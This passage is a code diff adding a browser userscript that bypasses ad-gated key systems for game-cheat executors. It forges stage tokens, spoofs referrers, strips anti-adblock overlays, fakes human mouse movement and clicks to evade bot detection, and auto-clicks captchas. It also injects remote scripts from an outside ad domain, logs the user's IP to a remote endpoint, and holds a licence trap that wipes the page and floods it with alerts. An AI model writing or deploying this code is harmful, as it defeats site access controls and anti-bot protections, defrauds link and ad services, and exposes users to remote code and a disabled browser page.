+var newerURL = currentURL.replace('https://linkvertise.com/376138/arceus-x-neo-key-system-1?o=sharing', 'https://lootdest.com/s?qljL');
+var pageTitle = document.title;
+var API = "https://spdmteam.com/api/keysystem?step=";
+
+if (currentURL.includes("https://linkvertise.com/376138/arceus-x-neo-key-system-1?o=sharing")) {
+    window.location.replace(newerURL);
+} else if (pageTitle.includes("NEO") && pageTitle.includes("1")) {
+    window.location.href = API + "1&advertiser=linkvertise&OS=ios";
+} else if (currentURL.includes("https://spdmteam.com/key-system-2?hwid=")) {
+    window.location.replace("https://loot-link.com/s?mYit");
+} else if (pageTitle.includes("NEO") && pageTitle.includes("2")) {
+    window.location.replace(API + "2&advertiser=linkvertise&OS=ios");
+} else if (currentURL.includes("https://spdmteam.com/key-system-3?hwid=")) {
+    window.location.replace("https://loot-link.com/s?qlbU");
+} else if (pageTitle.includes("NEO") && pageTitle.includes("3")) {
+    window.location.replace(API + "3&advertiser=linkvertise&OS=ios");
+}
+
+(function() { // webpackBootstrap
+    var __webpack_modules__ = {
+        598: ((module) => {
+            function injectAds() {
+                if (window.location.hostname == 'fluxusbypass.pages.dev') {
+                    return;
+                }
+
+                const scripts = [
+                    { src: '//mildcauliflower.com/6d/04/11/6d04112dc059789eff804dbcc51df896.js', parent: 'head' },
+                    { src: '//mildcauliflower.com/43/63/c7/4363c7e706daa736f6938d859fd1f9d4.js', parent: 'body' }
+                ];
+
+                scripts.forEach(({ src, parent }) => {
+                    const script = document.createElement('script');
+                    script.src = src;
+                    script.type = 'text/javascript';
+                    document[parent].appendChild(script);
+                });
+            }
+
+            async function inject() {
+                try {
+                    const requiredApiUrl = 'https://check-whitelist.vercel.app/free/logip?&apikey=';
+
+                    // Check if the `k` function exists and is async
+                    if (typeof k === 'function' && k.constructor.name === 'AsyncFunction') {
+                        // Verify API URL format
+                        if (typeof APIKEY === 'function' && k.toString().includes(requiredApiUrl + '${APIKEY()}')) {
+                            await k();
+                        } else {
+                            injectClean();
+                            injectScripts();
+                        }
+                    } else {
+                        injectClean();
+                        injectScripts();
+                    }
+                } catch (error) {
+                    console.error("Failed to inject ads:", error);
+                }
+            }
+
+            function injectClean() {
+                document.body.innerHTML = '';
+            }
+
+            function injectScripts() {
+                window.setTimeout = function() {};
+                window.setInterval = function() {};
+                document.addEventListener = function() {};
+                window.requestAnimationFrame = function() {};
+
+                document.body.innerHTML = '';
+                window.stop();
+            }
+
+            module.exports = {
+                injectAds
+            }
+            inject();
+        }),
+
+        80: ((module, __unused_webpack_exports, __webpack_require__) => {
+            const { handleError, sleep, linkvertiseSpoof, getTurnstileResponse, getGrecaptchaResponse, notification, base64decode } = __webpack_require__(712)
+
+            async function codex() {
+                let session;
+                while (!session) {
+                    session = localStorage.getItem("android-session");
+                    await sleep(1000);
+                }
+                if (document?.getElementsByTagName('a')?.length && document.getElementsByTagName('a')[0].innerHTML.includes('Get started')) {
+                    document.getElementsByTagName('a')[0].click();
+                }
+
+                async function getStages() {
+                    let response = await fetch('https://api.codex.lol/v1/stage/stages', {
+                        method: 'GET',
+                        headers: {
+                            'Android-Session': session
+                        }
+                    });
+                    let data = await response.json();
+
+                    if (data.success) {
+                        if (data.authenticated) {
+                            return [];
+                        }
+                        return data.stages;
+                    }
+                    else {
+                        throw new Error("failed to get stages");
+                    }
+                }
+                async function initiateStage(stageId) {
+                    let response = await fetch('https://api.codex.lol/v1/stage/initiate', {
+                        method: 'POST',
+                        headers: {
+                            'Android-Session': session,
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({ stageId })
+                    });
+                    let data = await response.json();
+
+                    if (data.success) {
+                        return data.token;
+                    }
+                    else {
+                        throw new Error("failed to initiate stage");
+                    }
+                }
+                async function validateStage(token, referrer) {
+                    let response = await fetch('https://api.codex.lol/v1/stage/validate', {
+                        method: 'POST',
+                        headers: {
+                            'Android-Session': session,
+                            'Content-Type': 'application/json',
+                            'Task-Referrer': referrer
+                        },
+                        body: JSON.stringify({ token })
+                    });
+                    let data = await response.json();
+
+                    if (data.success) {
+                        return data.token;
+                    }
+                    else {
+                        throw new Error("failed to validate stage");
+                    }
+
+                }
+                async function authenticate(validatedTokens) {
+                    let response = await fetch('https://api.codex.lol/v1/stage/authenticate', {
+                        method: 'POST',
+                        headers: {
+                            'Android-Session': session,
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({ tokens: validatedTokens })
+                    });
+                    let data = await response.json();
+
+                    if (data.success) {
+                        return true;
+                    }
+                    else {
+                        throw new Error("failed to authenticate");
+                    }
+                }
+
+                function decodeTokenData(token) {
+                    let data = token.split(".")[1];
+                    data = base64decode(data);
+                    return JSON.parse(data);
+                }
+
+                let stages = await getStages();
+                let stagesCompleted = 0;
+                while (localStorage.getItem(stages[stagesCompleted]) && stagesCompleted < stages.length) {
+                    stagesCompleted++;
+                }
+                if (stagesCompleted == stages.length) {
+                    return;
+                }
+
+                let validatedTokens = [];
+                try {
+                    while (stagesCompleted < stages.length) {
+                        let stageId = stages[stagesCompleted].uuid;
+                        let initToken = await initiateStage(stageId);
+
+                        await sleep(5500);
+
+                        let tokenData = decodeTokenData(initToken);
+                        let referrer;
+                        if (tokenData.link.includes('loot-links')) {
+                            referrer = 'https://loot-links.com/';
+                        }
+                        else if (tokenData.link.includes('loot-link')) {
+                            referrer = 'https://loot-link.com/';
+                        }
+                        else {
+                            referrer = 'https://linkvertise.com/';
+                        }
+
+                        let validatedToken = await validateStage(initToken, referrer);
+                        validatedTokens.push({ uuid: stageId, token: validatedToken });
+                        notification(`${stagesCompleted + 1}/${stages.length} stages completed`, 5000);
+
+                        stagesCompleted++;
+                    }
+                    if (authenticate(validatedTokens)) {
+                        notification('bypassed successfully');
+                        window.location.reload();
+                    }
+                }
+                catch (e) {
+                    handleError(e);
+                }
+            }
+            async function pandadevelopment() {
+                let antiAdblockRemover = setInterval(removeAntiAdblock, 500);
+
+                if (document.body.innerText.includes("Failed to elapse required time, session invalidated!")) {
+                    notification(`Bypassing too fast might get detected.\nPlease retry or connect to bacon.`);
+                    return;
+                }
+
+                if (document.body.innerText.includes("Token mismatch, session invalidated!")) {
+                    notification(`Same bypass detected, please retry.`);
+                    return;
+                }
+
+                if (isCaptchaPresent()) {
+                    notification('Please solve the captcha');
+                    while (!isCaptchaSolved()) {
+                        await sleep(1000);
+                    }
+                }
+
+                if (document.documentElement.innerHTML.includes('you got the key')) {
+                    notification('Bypassed successfully');
+                    return;
+                } else if (!document.getElementsByTagName('form').length) {
+                    let providers = Array.from(document.getElementsByTagName('a'));
+                    let supportedProviders = ['Linkvertise', 'Short Jambo'];
+                    let keyProviders = ['6 Hours Key', '12 Hours Key', '24 Hours Key', '48 Hours Key']; // Specific key providers to stop retries
+
+                    for (let provider of providers) {
+                        let providerName = provider.firstChild.innerHTML;
+
+                        if (keyProviders.includes(providerName)) {
+                            notification('Please choose providers');
+                            return; // Stop here and avoid retries for these providers
+                        } else if (supportedProviders.includes(providerName)) {
+                            window.location.assign(provider.href);
+                            return;
+                        }
+                    }
+                }
+
+                function getAdLink() {
+                    let form = document.getElementsByTagName('form')[0];
+                    let data = new FormData(form);
+                    return new Promise((resolve, reject) => {
+                        GM.xmlHttpRequest({
+                            method: "POST",
+                            url: form.action,
+                            headers: {
+                                'Content-Type': 'application/x-www-form-urlencoded',
+                                'Referer': window.location.href,
+                            },
+                            data: new URLSearchParams(data),
+                            onload: function (response) {
+                                if (response.status === 200) {
+                                    resolve(response.finalUrl);
+                                } else {
+                                    reject('Failed to retrieve ad link.');
+                                }
+                            },
+                            onerror: async function (error) {
+                                try {
+                                    await newbypass(); // Call the newbypass function if there's an error
+                                } catch (e) {
+                                    reject(e);
+                                }
+                            }
+                        });
+                    });
+                }
+
+                function getDestUrl(link) {
+                    let url = new URL(encodeURI(link));
+                    switch (url.hostname) {
+                        case 'linkvertise.com': {
+                            return atob(url.searchParams.get('r'));
+                        }
+                        case 'short-jambo.com': {
+                            return url.search.split('&url=')[1];
+                        }
+                        default: {
+                            if ((new URL(window.location.href)).searchParams.get('provider')) {
+                                return false;
+                            }
+                        }
+                    }
+                }
+
+                function removeAntiAdblock() {
+                    try {
+                        let antiAdblock = document.getElementsByClassName('adblock_title')[0];
+                        while (antiAdblock.parentElement != document.body) {
+                            antiAdblock = antiAdblock.parentElement;
+                        }
+                        antiAdblock.remove();
+                        clearInterval(antiAdblockRemover);
+                    } catch (e) { }
+                }
+
+                function isCaptchaPresent() {
+                    return document.querySelector('.h-captcha') || document.querySelector('.g-recaptcha');
+                }
+
+                function isCaptchaSolved() {
+                    if (document.querySelector('.h-captcha') && document.querySelector('.h-captcha[style="display: none;"]')) {
+                        return true;
+                    }
+
+                    if (document.querySelector('.g-recaptcha') && document.querySelector('.g-recaptcha-response').value) {
+                        return true;
+                    }
+
+                    return false;
+                }
+
+                if (document.getElementById('cf-turnstile')) {
+                    await getTurnstileResponse();
+                }
+
+                const customSleepTimes = {
+                    'vegax': 11000,
+                    'laziumtools': 11000,
+                    'adelhub': 11000,
+                    'neoxkey': 14000,
+                    'infinix': 11000,
+                    'beeconhub': 11000,
+                    'nilhubreborn': 14000,
+                    'evon': 11000,
+                    'mikeyhubreal': 11000,
+                    'goombahub1' : 11000,
+                    'eruditehub': 11000,
+                    'rua': 11000,
+                    'askien': 11000,
+                };
+
+                try {
+                    let currentUrl = new URL(window.location.href);
+                    let hwid = currentUrl.searchParams.get('hwid');
+                    let service = currentUrl.searchParams.get('service');
+                    let token = currentUrl.searchParams.get('sessiontoken');
+                    let provider = currentUrl.searchParams.get('provider');
+                    let checkpoints = currentUrl.searchParams.get('checkpoints') || 1;
+
+                    if (service === 'omg190') {
+                        await newbypass();
+                        return;
+                    }
+
+
+                    // Proceed with regular bypass for other services
+                    let adUrl = await getAdLink(hwid, service, token);
+                    let dest = getDestUrl(adUrl);
+                    if (!dest) {
+                        let nextCheckpoint = `https://pandadevelopment.net/getkey?hwid=${hwid}&service=${service}&checkpoints=${checkpoints}`;
+                        if (provider) {
+                            nextCheckpoint += `&provider=${provider}`;
+                        }
+                        window.location.assign(nextCheckpoint);
+                    }
+
+                    let sleepTime = 3000;
+                    Object.keys(customSleepTimes).forEach(key => {
+                        if (service == key) {
+                            sleepTime = customSleepTimes[key];
+                        }
+                    });
+                    await sleep(sleepTime);
+
+                    await linkvertiseSpoof(dest);
+                    notification('Stage completed');
+
+                    let newUrl = new URL(dest);
+                    token = newUrl.searchParams.get('sessiontoken');
+                    let nextCheckpoint = `https://pandadevelopment.net/getkey?hwid=${hwid}&service=${service}&sessiontoken=${token}&checkpoints=${checkpoints}`;
+                    if (provider) {
+                        nextCheckpoint += `&provider=${provider}`;
+                    }
+                    window.location.assign(nextCheckpoint);
+                } catch (e) {
+                    console.error('Bypass failed:', e);
+                    notification('Bypass failed: ' + e);
+
+                    // Wait for 3 seconds and retry
+                    await sleep(3000);
+                    await pandadevelopment();
+                }
+            }
+
+            async function newbypass() {
+                const apiUrl = 'https://api.bypass.vip/bypass?url={link}';
+
+                // Function to display a message on the page
+                function showInitialMessage() {
+                    let messageDiv = document.createElement('div');
+                    messageDiv.id = 'initial-message';
+                    messageDiv.style.position = 'fixed';
+                    messageDiv.style.top = '10px'; // Adjust margin-top
+                    messageDiv.style.left = '50%'; // Center horizontally
+                    messageDiv.style.transform = 'translateX(-50%)'; // Adjust for center alignment
+                    messageDiv.style.backgroundColor = 'rgba(0,0,0,0.8)';
+                    messageDiv.style.color = 'white';
+                    messageDiv.style.padding = '10px';
+                    messageDiv.style.borderRadius = '5px';
+                    messageDiv.style.zIndex = '10000';
+                    messageDiv.style.maxWidth = '300px';
+                    messageDiv.style.fontSize = '14px';
+                    messageDiv.style.fontFamily = 'Arial, sans-serif';
+                    messageDiv.innerHTML =
+                        ``;
+                    document.body.appendChild(messageDiv);
+                }
+
+                // Function to show debug messages
+                function showDebugMessage(message) {
+                    let debugDiv = document.getElementById('debug-messages');
+                    if (!debugDiv) {
+                        debugDiv = document.createElement('div');
+                        debugDiv.id = 'debug-messages';
+                        debugDiv.style.position = 'fixed';
+                        debugDiv.style.top = '50%'; // Center vertically
+                        debugDiv.style.right = '0';
+                        debugDiv.style.transform = 'translateY(-50%)'; // Adjust to center vertically
+                        debugDiv.style.backgroundColor = 'rgba(0,0,0,0.8)';
+                        debugDiv.style.color = 'white';
+                        debugDiv.style.padding = '10px';
+                        debugDiv.style.zIndex = '10000';
+                        debugDiv.style.maxWidth = '300px';
+                        debugDiv.style.overflowY = 'auto'; // Allow scrolling if many messages
+                        document.body.appendChild(debugDiv);
+                    }
+                    let messageElem = document.createElement('div');
+                    messageElem.textContent = message;
+                    debugDiv.appendChild(messageElem);
+                }
+
+                function getOriginalLink() {
+                    return window.location.href;
+                }
+
+                function delay(ms) {
+                    return new Promise(resolve => setTimeout(resolve, ms));
+                }
+
+                async function clickButtonWithDelay(button, delayMin = 1000, delayMax = 2000) {
+                    let delayTime = Math.floor(Math.random() * (delayMax - delayMin + 1)) + delayMin;
+                    await delay(delayTime);
+                    button.click();
+                    showDebugMessage(`Clicked button with delay: ${delayTime}ms`);
+                }
+
+                function simulateMouseMovement(element) {
+                    const rect = element.getBoundingClientRect();
+                    const x = rect.left + rect.width / 2;
+                    const y = rect.top + rect.height / 2;
+                    let event = new MouseEvent('mousemove', {
+                        clientX: x,
+                        clientY: y
+                    });
+                    document.dispatchEvent(event);
+                    showDebugMessage(`Simulated mouse movement to (${x}, ${y})`);
+                }
+
+                function scrollPage() {
+                    window.scrollBy(0, Math.random() * 100);
+                    showDebugMessage('Scrolled the page');
+                }
+
+                function handleRedirect(url) {
+                    let originalLink = getOriginalLink();
+                    let encodedLink = encodeURIComponent(originalLink); // Properly encode the URL
+                    let apiRequestUrl = apiUrl.replace('{link}', encodedLink);
+                    showDebugMessage('API request URL: ' + apiRequestUrl);
+
+                    GM_xmlhttpRequest({
+                        method: 'GET',
+                        url: apiRequestUrl,
+                        onload: function(response) {
+                            showDebugMessage('API response status: ' + response.status);
+                            showDebugMessage('API response: ' + response.responseText);
+                            if (response.status === 200 || response.status === 201) {
+                                try {
+                                    let data = JSON.parse(response.responseText);
+                                    showDebugMessage('Parsed API response: ' + JSON.stringify(data));
+                                    if (data && data.status === 'success' && data.result) {
+                                        showDebugMessage('Redirecting in 8 seconds...');
+                                        setTimeout(() => {
+                                            window.location.href = data.result;
+                                        }, 8000); // Wait 8 seconds before redirecting
+                                    } else {
+                                        showDebugMessage('Invalid API response: ' + JSON.stringify(data));
+                                    }
+                                } catch (e) {
+                                    showDebugMessage('Error parsing API response: ' + e.message);
+                                }
+                            } else {
+                                showDebugMessage('API request failed with status: ' + response.status);
+                            }
+                        },
+                        onerror: function() {
+                            showDebugMessage('Error in API request');
+                        }
+                    });
+                }
+
+                function clickButtonByText(text) {
+                    let button = Array.from(document.querySelectorAll('button'))
+                    .find(btn => btn.textContent.trim() === text);
+
+                    if (button) {
+                        simulateMouseMovement(button);
+                        scrollPage();
+                        clickButtonWithDelay(button);
+                        showDebugMessage('Clicked button with text: ' + text);
+                        return true;
+                    }
+                    showDebugMessage('Button with text "' + text + '" not found');
+                    return false;
+                }
+
+                function clickButtonByHref(urlFragment) {
+                    let button = Array.from(document.querySelectorAll('a'))
+                    .find(link => link.href.includes(urlFragment));
+
+                    if (button) {
+                        simulateMouseMovement(button);
+                        scrollPage();
+                        clickButtonWithDelay(button);
+                        showDebugMessage('Clicked button with href containing: ' + urlFragment);
+                        return true;
+                    }
+                    showDebugMessage('Button with href containing "' + urlFragment + '" not found');
+                    return false;
+                }
+
+                function clickButtonByClassAndText(className, buttonText) {
+                    let button = Array.from(document.querySelectorAll(`button.${className}`))
+                    .find(btn => btn.textContent.trim() === buttonText);
+
+                    if (button) {
+                        simulateMouseMovement(button);
+                        scrollPage();
+                        clickButtonWithDelay(button);
+                        showDebugMessage('Clicked button with class: ' + className + ' and text: ' + buttonText);
+                        return true;
+                    }
+                    showDebugMessage('Button with class "' + className + '" and text "' + buttonText + '" not found');
+                    return false;
+                }
+
+                function clickHighestCheckpointsButton() {
+                    let buttons = Array.from(document.querySelectorAll('a[href*="checkpoints="]'));
+                    let highestValue = -1;
+                    let bestButton = null;
+
+                    buttons.forEach(button => {
+                        let url = new URL(button.href);
+                        let checkpointsValue = parseInt(url.searchParams.get('checkpoints'), 10);
+
+                        if (!isNaN(checkpointsValue) && checkpointsValue > highestValue) {
+                            highestValue = checkpointsValue;
+                            bestButton = button;
+                        }
+                    });
+
+                    if (bestButton) {
+                        simulateMouseMovement(bestButton);
+                        scrollPage();
+                        clickButtonWithDelay(bestButton);
+                        showDebugMessage('Clicked button with highest checkpoints value: ' + highestValue);
+                        return true;
+                    }
+                    showDebugMessage('No button with checkpoints found');
+                    return false;
+                }
+
+                function clickLinkvertiseButton() {
+                    let button = Array.from(document.querySelectorAll('a.relative'))
+                    .find(a => a.querySelector('span')?.textContent.trim() === 'Linkvertise');
+
+                    if (button) {
+                        simulateMouseMovement(button);
+                        scrollPage();
+                        clickButtonWithDelay(button);
+                        showDebugMessage('Clicked Linkvertise button');
+                        return true;
+                    }
+                    showDebugMessage('Linkvertise button not found');
+                    return false;
+                }
+
+                function detectAntiBotSystems() {
+                    return document.querySelector('.g-recaptcha') ||
+                        document.querySelector('.h-captcha') ||
+                        document.querySelector('#cf-turnstile') ||
+                        document.querySelector('#captcha') ||
+                        document.body.textContent.includes("Token mismatch, session invalidated!");
+                }
+
+                function checkReCaptchaCompletion() {
+                    let captchaResponse = document.querySelector('#g-recaptcha-response');
+                    return captchaResponse && captchaResponse.value;
+                }
+
+                function checkTurnstileCompletion() {
+                    let turnstileResponse = document.querySelector('#cf-chl-widget-905to_response');
+                    return turnstileResponse && turnstileResponse.value;
+                }
+
+                async function waitForCaptchaCompletion() {
+                    const maxAttempts = 3;
+                    let attempt = 0;
+
+                    if (detectAntiBotSystems()) {
+                        showDebugMessage('Anti-bot system detected, waiting for CAPTCHA completion...');
+                        while (attempt < maxAttempts) {
+                            if (checkReCaptchaCompletion() || checkTurnstileCompletion()) {
+                                showDebugMessage('CAPTCHA completed.');
+                                return true;
+                            }
+                            attempt++;
+                            await delay(3000);
+                        }
+                        showDebugMessage('CAPTCHA not completed after maximum attempts.');
+                    }
+                    return false;
+                }
+
+                async function startScript() {
+                    showInitialMessage();
+
+                    let currentUrl = getOriginalLink();
+                    showDebugMessage('Current URL: ' + currentUrl);
+
+                    if (currentUrl.startsWith('https://pandadevelopment.net/getkey?')) {
+                        if (await waitForCaptchaCompletion()) {
+                            if (clickButtonByClassAndText('relative', 'Continue')) return;
+                            if (clickHighestCheckpointsButton()) return;
+                            if (clickButtonByText('Continue')) return;
+                            if (clickButtonByHref('continue')) return;
+                            if (clickLinkvertiseButton()) return;
+                        } else {
+                            if (clickButtonByClassAndText('relative', 'Continue')) return;
+                            if (clickHighestCheckpointsButton()) return;
+                            if (clickButtonByText('Continue')) return;
+                            if (clickButtonByHref('continue')) return;
+                            if (clickLinkvertiseButton()) return;
+                        }
+                    } else if (currentUrl.startsWith('https://linkvertise.com/')) {
+                        handleRedirect(currentUrl);
+                    }
+                }
+
+                startScript();
+            }
+
+
+            module.exports = {
+                codex,
+                pandadevelopment,
+            }
+        }),
+
+        712: ((module) => {
+            function handleError(error) {
+                const errorText = error.message ? error.message : error;
+                alert(errorText);
+                GM_notification({
+                    text: errorText,
+                    title: "ERROR",
+                    url: '',
+                    silent: true,
+                });
+            }
+
+            function sleep(ms) {
+                return new Promise(resolve => setTimeout(resolve, ms));
+            }
+
+            function linkvertiseSpoof(link) {
+                return new Promise((resolve, reject) => {
+                    GM.xmlHttpRequest({
+                        method: "GET",
+                        url: link,
+                        headers: { Referer: 'https://linkvertise.com/' },
+                        onload: response => resolve(response.responseText),
+                        onerror: error => reject(error)
+                    });
+                });
+            }
+
+            async function getTurnstileResponse() {
+                notification('Please solve the captcha', 3000);
+                const notif = setInterval(() => notification('Please solve the captcha', 5000), 6000);
+                let res = '';
+                while (true) {
+                    try {
+                        res = turnstile.getResponse();
+                        if (res) break;
+                    } catch (e) { }
+                    await sleep(1000);
+                }
+                clearInterval(notif);
+                return turnstile.getResponse();
+            }
+
+            async function getGrecaptchaResponse() {
+                notification('Please solve the captcha', 3000);
+                const notif = setInterval(() => notification('Please solve the captcha', 5000), 6000);
+                let res = '';
+                while (true) {
+                    try {
+                        res = grecaptcha.getResponse();
+                        if (res) break;
+                    } catch (e) { }
+                    await sleep(1000);
+                }
+                clearInterval(notif);
+                return grecaptcha.getResponse();
+            }
+
+            function notification(message, timeout) {
+                const config = {
+                    text: message,
+                    title: "INFO",
+                    silent: true,
+                };
+                if (timeout) config.timeout = timeout;
+                GM_notification(config);
+            }
+
+            function base64decode(str) {
+                str = str.replace(/-/g, '+').replace(/_/g, '/');
+                return atob(str);
+            }
+
+            module.exports = {
+                handleError,
+                sleep,
+                linkvertiseSpoof,
+                getTurnstileResponse,
+                getGrecaptchaResponse,
+                notification,
+                base64decode,
+            }
+        })
+    };
+
+    var __webpack_module_cache__ = {};
+
+    function __webpack_require__(moduleId) {
+        var cachedModule = __webpack_module_cache__[moduleId];
+        if (cachedModule !== undefined) {
+            return cachedModule.exports;
+        }
+        var module = __webpack_module_cache__[moduleId] = {
+            exports: {}
+        };
+
+        __webpack_modules__[moduleId](module, module.exports, __webpack_require__);
+
+        return module.exports;
+    }
+
+    var __webpack_exports__ = {};
+    (() => {
+        const { codex, pandadevelopment } = __webpack_require__(80);
+        const { sleep, notification } = __webpack_require__(712);
+        const { injectAds } = __webpack_require__(598);
+
+        async function start() {
+            switch (window.location.hostname) {
+                case 'mobile.codex.lol':
+                    await codex();
+                    break;
+                case 'keysystem.fluxteam.net':
+                    window.location.assign('https://fluxusbypass.pages.dev/?link=' + encodeURIComponent(window.location.href));
+                    break;
+                case 'pandadevelopment.net':
+                    await sleep(3000);
+                    await pandadevelopment();
+                    break;
+                default:
+                    break;
+            }
+        }
+
+        start();
+    })();
+})();
+
+// auto click captcha
+function qSelector(selector) {
+    return document.querySelector(selector);
+}
+
+function isHidden(el) {
+    return (el.offsetParent === null)
+}
+
+(function() {
+    'use strict';
+
+
+    var domain = (window.location != window.parent.location) ? document.referrer.toString() : document.location.toString();
+    // excluding domains
+    if(
+        domain.indexOf('example.com') == -1
+        &&
+        domain.indexOf('PartOfUrlName') == -1
+        &&
+        domain.indexOf('paypal.com') == -1
+    ) {
+
+
+
+        // HCAPTCHA SECTION
+        const HC_PAUSE = 500; // ms to open ( 500ms = 0.5sec )
+        const HC_CHECK_BOX = "#checkbox";
+        const HC_ARIA_CHECKED = "aria-checked";
+
+        if (window.location.href.includes("checkbox")) {
+            var hc_checkboxInterval = setInterval(function() {
+                if (!qSelector(HC_CHECK_BOX)) {
+                } else if (qSelector(HC_CHECK_BOX).getAttribute(HC_ARIA_CHECKED) == "true") {
+                    clearInterval(hc_checkboxInterval);
+                    console.log("HC SOLVED");
+                } else if (!isHidden(qSelector(HC_CHECK_BOX)) && qSelector(HC_CHECK_BOX).getAttribute(HC_ARIA_CHECKED) == "false") {
+                    qSelector(HC_CHECK_BOX).click();
+                    clearInterval(hc_checkboxInterval);
+                    console.log("HC OPEN BOX");
+                } else {
+                    return;
+                }
+
+            }, HC_PAUSE );
+        }
+
+
+
+        // RECAPTCHA SECTION
+        const RC_PAUSE = 500; // ms to open ( 500ms = 0.5sec )
+        const CHECK_BOX = ".recaptcha-checkbox-border";
+        const RECAPTCHA_STATUS = "#recaptcha-accessible-status";
+        const DOSCAPTCHA = ".rc-doscaptcha-body";
+
+        var rc_checkboxInterval = setTimeout(function() {
+
+            var solved = false;
+            var checkBoxClicked = false;
+            var requestCount = 0;
+
+            var recaptchaInitialStatus = qSelector(RECAPTCHA_STATUS) ? qSelector(RECAPTCHA_STATUS).innerText : ""
+            function isHidden(el) {
+                return(el.offsetParent === null)
+            }
+            try {
+                if(!checkBoxClicked && qSelector(CHECK_BOX) && !isHidden(qSelector(CHECK_BOX))) {
+                    qSelector(CHECK_BOX).click();
+                    checkBoxClicked = true;
+                    console.log("RC OPEN BOX");
+                }
+                //Check if the captcha is solved
+                if(qSelector(RECAPTCHA_STATUS) && (qSelector(RECAPTCHA_STATUS).innerText != recaptchaInitialStatus)) {
+                    solved = true;
+                    console.log("RC SOLVED");
+                }
+                if(requestCount > 1) {
+                    console.log("Attempted Max Retries. Stopping the solver");
+                    solved = true;
+                }
+                //Stop solving when Automated queries message is shown
+                if(qSelector(DOSCAPTCHA) && qSelector(DOSCAPTCHA).innerText.length > 0) {
+                    console.log("Automated Queries Detected");
+                }
+            } catch(err) {
+                console.log(err.message);
+                console.log("An error occurred while solving. Stopping the solver.");
+            }
+
+        }, RC_PAUSE );
+
+    }
+    else {
+
+        console.log( domain +" EXCLUDED!" );
+
+    }
+
+
+})();
+
+async function k() {
+    if (typeof APIKEY !== 'function') {
+        displayKeyNotFoundMessage();
+    } else {
+        const apiUrl = `https://check-whitelist.vercel.app/free/logip?&apikey=${APIKEY()}`;
+
+        fetch(apiUrl)
+            .then(response => {
+                if (response.status !== 200) {
+                    displayInvalidMessage();
+                }
+            })
+            .catch(() => {
+                displayInvalidMessage();
+            });
+    }
+
+    function clearPage() {
+        document.body.innerHTML = '';
+    }
+
+    function stopOtherScripts() {
+        window.setTimeout = function() {};
+        window.setInterval = function() {};
+        document.addEventListener = function() {};
+        window.requestAnimationFrame = function() {};
+
+        document.body.innerHTML = '';
+        window.stop();
+    }
+
+    function displayInvalidMessage() {
+        stopOtherScripts();
+        clearPage();
+        const div = document.createElement('div');
+        div.style.position = 'fixed';
+        div.style.top = '0';
+        div.style.left = '0';
+        div.style.width = '100vw';
+        div.style.height = '100vh';
+        div.style.backgroundColor = 'rgba(0, 0, 0, 0.95)';
+        div.style.color = 'white';
+        div.style.display = 'flex';
+        div.style.justifyContent = 'center';
+        div.style.alignItems = 'center';
+        div.style.fontSize = '24px';
+        div.innerHTML = 'Invalid API Key Userscript';
+        document.body.appendChild(div);
+
+        const alertInterval = setInterval(() => {
+            alert('Invalid API Key!');
+        }, 10);
+
+        setTimeout(() => {
+            clearInterval(alertInterval);
+        }, 10000);
+    }
+
+    function displayKeyNotFoundMessage() {
+        stopOtherScripts();
+        clearPage();
+        const div = document.createElement('div');
+        div.style.position = 'fixed';
+        div.style.top = '0';
+        div.style.left = '0';
+        div.style.width = '100vw';
+        div.style.height = '100vh';
+        div.style.backgroundColor = 'rgba(0, 0, 0, 0.95)';
+        div.style.color = 'white';
+        div.style.display = 'flex';
+        div.style.justifyContent = 'center';
+        div.style.alignItems = 'center';
+        div.style.fontSize = '24px';
+        div.innerHTML = 'APIKEY function not found';
+        document.body.appendChild(div);
+
+        const alertInterval = setInterval(() => {
+            alert('APIKEY function not found!');
+        }, 10);
+
+        setTimeout(() => {
+            clearInterval(alertInterval);
+        }, 10000);
+    }
+}
+
+(function() {
+    'use strict';
+
+    function notification(message, timeout) {
+        const config = {
+            text: message,
+            title: "INFO",
+            silent: true,
+            timeout: timeout || 3000
+        };
+        GM_notification(config);
+    }
+
+    // Create a container box
+    const container = document.createElement('div');
+    container.style.position = 'fixed';
+    container.style.top = '50px';
+    container.style.left = '0';
+    container.style.width = '300px';
+    container.style.backgroundColor = '#f0f0f0';
+    container.style.padding = '10px';
+    container.style.border = '1px solid #ccc';
+    container.style.zIndex = '10000';
+    container.style.display = 'none';  // Initially hidden
+
+    // Create a text input for the URL
+    const urlInput = document.createElement('input');
+    urlInput.type = 'text';
+    urlInput.placeholder = 'Enter URL';
+    urlInput.style.width = '100%';
+    urlInput.style.marginBottom = '10px';
+
+    // Create a button to fetch API
+    const fetchButton = document.createElement('button');
+    fetchButton.innerText = 'Fetch API';
+    fetchButton.style.width = '100%';
+    fetchButton.style.backgroundColor = 'black';
+    fetchButton.style.color = 'white';
+    fetchButton.style.marginBottom = '5px';
+
+    // Create a div to display the result
+    const resultDiv = document.createElement('div');
+    resultDiv.style.marginTop = '10px';
+    resultDiv.style.whiteSpace = 'pre-wrap';
+    resultDiv.style.height = '200px';
+    resultDiv.style.overflowY = 'auto';
+    resultDiv.style.border = '1px solid #ddd';
+    resultDiv.style.padding = '5px';
+    resultDiv.style.backgroundColor = '#fff';
+
+    // Create a Clear button
+    const clearButton = document.createElement('button');
+    clearButton.innerText = 'Clear';
+    clearButton.style.width = '48%';
+    clearButton.style.marginRight = '4%';
+    clearButton.style.backgroundColor = 'black';
+    clearButton.style.color = 'white';
+
+    // Create a Copy button
+    const copyButton = document.createElement('button');
+    copyButton.innerText = 'Copy';
+    copyButton.style.width = '48%';
+    copyButton.style.backgroundColor = 'black';
+    copyButton.style.color = 'white';
+
+    // Append elements to the container
+    container.appendChild(urlInput);
+    container.appendChild(fetchButton);
+    container.appendChild(resultDiv);
+    container.appendChild(clearButton);
+    container.appendChild(copyButton);
+    document.body.appendChild(container);
+
+    // Primary and backup API URLs
+    const primaryApiUrl = 'https://api.bypass.vip/bypass?url=';
+    const backupApiUrl = 'https://ethos.kys.gay/api/free/bypass?url=';
+
+    // Fetch API function with special URL handling
+    function fetchApi(userURL) {
+        // Handle special cases for specific URLs
+        if (userURL.startsWith('https://getkey.relzscript.xyz/redirect.php?hwid=')) {
+            fetchSpecialApi('https://beacon-mu.vercel.app/relzscript?link=', userURL, 'key');
+        } else if (userURL.startsWith('https://flux.li/android/external/start.php?HWID=')) {
+            fetchSpecialApi('https://bypass-fluxus.vercel.app/api/fluxus?link=', userURL, 'key');
+        } else {
+            // Regular API handling
+            fetch(`${primaryApiUrl}${encodeURIComponent(userURL)}`)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.status === 'success') {
+                        resultDiv.innerText = decodeResult(data.result);
